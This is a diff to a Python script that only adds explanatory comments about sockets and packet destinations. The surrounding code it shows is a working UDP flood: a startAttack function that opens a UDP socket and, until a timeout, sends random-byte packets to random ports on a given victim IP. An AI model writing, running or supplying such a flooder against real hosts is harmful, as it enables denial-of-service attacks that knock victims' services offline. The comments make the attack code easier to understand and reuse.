@@ -11,7 +11,9 @@ def usage():
 
 
 def startAttack(victim_ip, duration):
-	# open a socket, "SOCK_DGRAM" means UDP type program
+	# open a socket
+	# AF_INET is for IP communication
+	# SOCK_DGRAM is for UDP packets
 	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
 	msg = bytes(random.getrandbits(10))
@@ -23,6 +25,7 @@ def startAttack(victim_ip, duration):
 	while time.time() < timeout:
 		victim_port = random.randint(1025, 65356)
 		# send packet
+		# destination is a pair ip-port
 		sock.sendto(msg, (victim_ip, victim_port))
 		sent_packets += 1
 
